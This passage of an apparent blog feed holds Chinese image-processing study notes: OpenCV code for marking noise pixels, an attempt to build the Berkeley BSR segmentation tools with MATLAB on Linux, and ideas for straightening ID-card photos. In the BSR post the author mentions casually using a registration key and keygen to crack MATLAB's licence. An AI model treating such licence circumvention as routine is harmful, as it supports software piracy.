class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">2</span></span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    max1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">1</span> <span class="keyword">and</span> p[i] &gt; max1:</span><br><span class="line">            max1 = p[i]</span><br><span class="line">    min2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">2</span> <span class="keyword">and</span> p[i] &lt; min2:</span><br><span class="line">            min2 = p[i]</span><br><span class="line">    <span class="keyword">if</span> max1 - min2 &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊值处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">special_check</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p_sum = <span class="built_in">int</span>(p[<span class="number">0</span>])+<span class="built_in">int</span>(p[<span class="number">1</span>])+<span class="built_in">int</span>(p[<span class="number">2</span>])+<span class="built_in">int</span>(p[<span class="number">3</span>])+<span class="built_in">int</span>(p[<span class="number">4</span>])+<span class="built_in">int</span>(p[<span class="number">5</span>])+<span class="built_in">int</span>(p[<span class="number">6</span>])+<span class="built_in">int</span>(p[<span class="number">7</span>])</span><br><span class="line">    max_differ = <span class="number">0</span></span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>) &gt; max_differ:</span><br><span class="line">            max_differ = <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>)</span><br><span class="line">            max_index = i</span><br><span class="line">    <span class="keyword">if</span> max_differ &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> _1d_2_2d(max_index)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 考虑位置</span></span><br><span class="line">            part2, flag2 = division2(_8_area)</span><br><span class="line">            <span class="keyword">if</span> flag1 == <span class="literal">False</span> <span class="keyword">or</span> flag2 == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            sx, sy = special_check(_8_area)</span><br><span class="line">            <span class="keyword">if</span> sx != -<span class="number">1</span>:</span><br><span class="line">                result[i - <span class="number">1</span> + sx][j - <span class="number">1</span> + sy] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 比较</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> part1[k] != part2[k]:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                pixel_channel.channel[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.noise.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.noise[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.pixel.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.channel[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p><img src="https://i.loli.net/2021/04/18/Lp1PkSxDM6NH9gs.png" alt="3"></p><p>如下图所示，红框内表示没有被标记出的噪声点</p><img src="https://i.loli.net/2021/04/18/ApXksYoy5LudCKF.png" alt="denoised_img" style="zoom:200%;" />]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210411</title>
      <link href="/20210411-img-report/"/>
      <url>/20210411-img-report/</url>
      
        <content type="html"><![CDATA[<p>一开始拿到一份BSR文件，但不知道如何使用</p><p>好在检索能力和运气都还算可以，找到了一个网页（应该是官网）</p><p><a href="https://www2.eecs.berkeley.edu/Research/Projects/CS/vision/grouping/resources.html">https://www2.eecs.berkeley.edu/Research/Projects/CS/vision/grouping/resources.html</a></p><p><img src="https://i.loli.net/2021/04/18/9jh7bfHXSYm5oGT.png" alt="4"></p><p>从这里下载了完整版的BSR，里面有说明文档</p><p><img src="https://i.loli.net/2021/04/18/EmRhkn2J6sMF137.png" alt="img"></p><p>发现提供的代码是要在linux或mac下运行的，因为比较熟悉linux，所以我选择使用linux的虚拟机</p><p>README_linux译文：</p><blockquote><p>按照以下步骤从Linux系统上的源代码编译Berkeley分段资源：</p><p>[使用MATLAB-r2013a在Ubuntu 12.10上测试]。</p><p>1.必备条件：</p><p>A.我们假设您已经安装了MATLAB，并且正确配置了MEX(在MATLAB提示符下键入MEX-SETUP)。</p><p>B.确保MATLAB在您的路径中，例如：<br>$EXPORT PATH=$PATH：/opt/matlab-r2011a/bin。</p><p>C.确保您的系统具有所需的映像库：<br>$sudo apt-get install libjpeg-dev。<br>$sudo apt-get install libpng-dev。</p><p>D.强制MATLAB加载系统的最新库，而不是其自己的旧版本：<br>$EXPORT LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6:/usr/lib/x86_64-linux-gnu/libstdc++.so.6:/lib/x86_64-linux-gnu/libgcc_s.so.1；</p><p>2.编译：</p><p>A.我们假设您在名为/bsr/的文件夹中解压缩了.tgz文件。</p><p>B.编辑文件/bsr/grouping/source/gpb_src/Rules.make中的以下行，使其指向matlab所在的目录。<br>已安装(下面给出的示例)：</p><p>Matlab_path：=/opt/matlab-r2011a。</p><p>此外，如果您使用的是32位体系结构而不是64位体系结构，请取消注释。<br>指定32位体系结构的行，并注释指定。<br>64位：</p><p>#MATLAB MEX文件编译设置-MATLAB架构(32位机器)。<br>Matlab_ARCH：=glnx86。<br>MEX_EXTN：=mexglx。</p><p>#MATLAB MEX文件编译设置-MATLAB架构(64位机器)。<br>#matlab_arch：=glnxa64。<br>#MEX_EXTN：=mexa64。</p><p>C.转到/bsr/grouping/source并键入以下命令：<br>$source build.sh。</p><p>此脚本应构建所有包，并将生成的.mex文件复制到/bsr/grouping/lib目录中。</p><p>3.使用示例：</p><p>A./bsr/grouping/test_gpb_ucm.m：在小镜像上运行gpb_ucm测试编译。</p><p>B./bsr/grouping/example.m：gpb_ucm的使用示例，包括对大图的支持。</p><p>C./bsr/bench/test_bichs.m：具有各种输入格式的BSDS500基准的使用示例。</p></blockquote><p>可以从MATLAB-r2013a和Ubuntu 12.10看出，这个还是比较旧的版本，ubuntu12.10的镜像现在是很难找到了，不过操作系统几乎都是可以向前兼容的，所以暂且使用ubuntu20.04，希望可以成功，而编译环境的部分——MATLAB，也有同样的问题，我只能找到比较靠近r2013a的r2015b</p><p>安装自然是对着网上的教程，但MATLAB的激活步骤出了问题， MATLAB是有版权限制的，但只要利用给出的注册码和注册机伪破解就可以解决，但是偏偏产生了“段错误”，而且像这样的问题往往很难解决，因为一千台电脑就有一千种环境，但还是只能搜索原因：</p><p><img src="https://i.loli.net/2021/04/18/mY3CvNkZGyt8aRd.png" alt="img"></p><p>但是没有结果，看来只能选择不同的版本重装，至此问题仍然没有解决</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210314</title>
      <link href="/20210314-img-report/"/>
      <url>/20210314-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="证件照片的矫正"><a href="#证件照片的矫正" class="headerlink" title="证件照片的矫正"></a>证件照片的矫正</h2><h3 id="会议上的方法有问题"><a href="#会议上的方法有问题" class="headerlink" title="会议上的方法有问题"></a>会议上的方法有问题</h3><p>会议上提出：先由用户通过交互的方式，大致找出边缘，再由程序确定出真正的边缘，然后将歪斜的证件图片的较长的长（a）和宽（b）取出，组成一个a X b的矩形，将原图片的像素点映射到新的图像上</p><h4 id="交互的问题"><a href="#交互的问题" class="headerlink" title="交互的问题"></a>交互的问题</h4><p>参照现有产品“扫描全能王”：</p><ol><li>如使用普通模式，需要用户利用给出的“框”，框选证件的边缘。其中，这一步操作会用到“磁吸”的效果，类似于PS软件中的“磁性套索”。这对我来说是一个难点，我的想法是：在用户拍完照后，程序就已经找出了可能的边缘，再由用户框选出最终的边缘（这一步很像人工智能在训练）。所以该普通模式可以让寻找边缘变得更精准（如果拍出来的证件或文件看上去是曲线也可以），但是用户的操作效率较低，不知道是不是在一个可以接受的范围内</li><li>如使用证件模式，该软件就会给出一个适合某一类证件的方框，让用户对准方框即可，但如果使用该模式，且用户使用得当（几乎对准了证件），我认为就失去了矫正的意义，只需要微调即可</li></ol><h3 id="我的想法"><a href="#我的想法" class="headerlink" title="我的想法"></a>我的想法</h3><h4 id="找边缘"><a href="#找边缘" class="headerlink" title="找边缘"></a>找边缘</h4><p>直接采用老师已教方法，或者方便一点，利用库函数：高斯滤波+卷积核+膨胀+canny边缘</p><h4 id="定四点"><a href="#定四点" class="headerlink" title="定四点"></a>定四点</h4><p>highgui库可以利用交互的方式解决</p><p>或者利用边缘定点</p><h4 id="变换"><a href="#变换" class="headerlink" title="变换"></a>变换</h4><p>opencv提供了仿射变换和透视变换的功能</p><blockquote><h5 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h5><p>在仿射变换中，原始图像中的所有平行线在输出图像中仍将平行。为了找到变换矩阵，我们需要</p><p>输入图像中的三个点及其在输出图像中的对应位置。然后<strong>cv.getAffineTransform</strong>将创建一个2x3</p><p>矩阵，该矩阵将传递给<strong>cv.warpAffine</strong>。</p><p>查看以下示例，并查看我选择的点（以绿色标记）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">img = cv.imread(<span class="string">&#x27;drawing.png&#x27;</span>)</span><br><span class="line">rows,cols,ch = img.shape</span><br><span class="line">pts1 = np.float32([[<span class="number">50</span>,<span class="number">50</span>],[<span class="number">200</span>,<span class="number">50</span>],[<span class="number">50</span>,<span class="number">200</span>]])</span><br><span class="line">pts2 = np.float32([[<span class="number">10</span>,<span class="number">100</span>],[<span class="number">200</span>,<span class="number">50</span>],[<span class="number">100</span>,<span class="number">250</span>]])</span><br><span class="line">M = cv.getAffineTransform(pts1,pts2)</span><br><span class="line">dst = cv.warpAffine(img,M,(cols,rows))</span><br><span class="line">plt.subplot(<span class="number">121</span>),plt.imshow(img),plt.title(<span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>),plt.imshow(dst),plt.title(<span class="string">&#x27;Output&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011531512.png" alt="1"></p><h5 id="透视变换"><a href="#透视变换" class="headerlink" title="透视变换"></a>透视变换</h5><p>对于透视变换，您需要3x3变换矩阵。即使在转换后，直线也将保持直线。要找到此变换矩阵，您</p><p>需要在输入图像上有4个点，在输出图像上需要相应的点。在这四个点中，其中三个不应共线。然</p><p>后可以通过函数<strong>cv.getPerspectiveTransform</strong>找到变换矩阵。然后将<strong>cv.warpPerspective</strong>应</p><p>用于此3x3转换矩阵。</p><p>请参见下面的代码：</p><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">img = cv.imread(<span class="string">&#x27;sudoku.png&#x27;</span>)</span><br><span class="line">rows,cols,ch = img.shape</span><br><span class="line">pts1 = np.float32([[<span class="number">56</span>,<span class="number">65</span>],[<span class="number">368</span>,<span class="number">52</span>],[<span class="number">28</span>,<span class="number">387</span>],[<span class="number">389</span>,<span class="number">390</span>]])</span><br><span class="line">pts2 = np.float32([[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">300</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">300</span>],[<span class="number">300</span>,<span class="number">300</span>]])</span><br><span class="line">M = cv.getPerspectiveTransform(pts1,pts2)</span><br><span class="line">dst = cv.warpPerspective(img,M,(<span class="number">300</span>,<span class="number">300</span>))</span><br><span class="line">plt.subplot(<span class="number">121</span>),plt.imshow(img),plt.title(<span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>),plt.imshow(dst),plt.title(<span class="string">&#x27;Output&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011531118.png" alt="2"></p></blockquote><p>在变换方面因为接触的还太少，很遗憾不能想出更好的方法</p><h4 id="加工"><a href="#加工" class="headerlink" title="加工"></a>加工</h4><p>但是这样的做法显然是粗糙的，我们可以加工的更完美，利用上面方法大致矫正了之后，再以自己的程序进行调整，也许会更好</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210307</title>
      <link href="/20210307-img-report/"/>
      <url>/20210307-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="算法学习"><a href="#算法学习" class="headerlink" title="算法学习"></a>算法学习</h2><p>该部分内容基本与讨论纪要相同，这里引用一下</p><blockquote><h1 id="讨论纪要"><a href="#讨论纪要" class="headerlink" title="讨论纪要"></a>讨论纪要</h1><h2 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h2><p>划分区域的分界线应与较大区分度的连线重合</p><p>所以由此可得出一种可能可行的方案：若这两种连线不符，则存在干扰点</p><h2 id="实行步骤"><a href="#实行步骤" class="headerlink" title="实行步骤"></a>实行步骤</h2><p>取5X5的像素点，以2X2方格为一个单位，找出5-6个边缘单位与前6个区分度大的单位，若不相符，则区分度最大的单位就标记为噪声（<u>这里我并不清楚究竟要标记哪一个点，因为一个单位有四个点</u>）</p><h3 id="求出边缘单位"><a href="#求出边缘单位" class="headerlink" title="求出边缘单位"></a>求出边缘单位</h3><p>以2X2个像素点为一个单位，进行区域划分，将该步骤抽象为“剪断差值大的边”，将“剪断边”的地方视为通路，将多个通路连通，形成边缘线（<u>这步操作的难点在于：1.不知道是不是一定会存在这样的通路；2.遍历每个单位格的效率存在问题；3.需要进一步思考，要将通路以什么样的方式存储，后面步骤比较</u>）</p><h3 id="求出较大区分度单位"><a href="#求出较大区分度单位" class="headerlink" title="求出较大区分度单位"></a>求出较大区分度单位</h3><p>求该步比较简单（<u>最大问题与上面的3相同，需要进一步考虑存储区分度的问题</u>）</p></blockquote><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>读取test1.png，找出噪声值，并输出到output.txt</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011525076.png" alt="test1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解释器：anaconda3/python3.8</span></span><br><span class="line"><span class="comment"># 编译器：pycharm</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 像素点数组</span></span><br><span class="line">Pixel_type = np.dtype(&#123;</span><br><span class="line">    <span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;noise&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单位方格数组</span></span><br><span class="line">Grid_type = np.dtype(&#123;</span><br><span class="line">    <span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;division_degree&#x27;</span>, <span class="string">&#x27;big_degree&#x27;</span>, <span class="string">&#x27;up&#x27;</span>, <span class="string">&#x27;down&#x27;</span>, <span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;right&#x27;</span>, <span class="string">&#x27;step&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_file</span>(<span class="params">image_array, x, y</span>):</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span 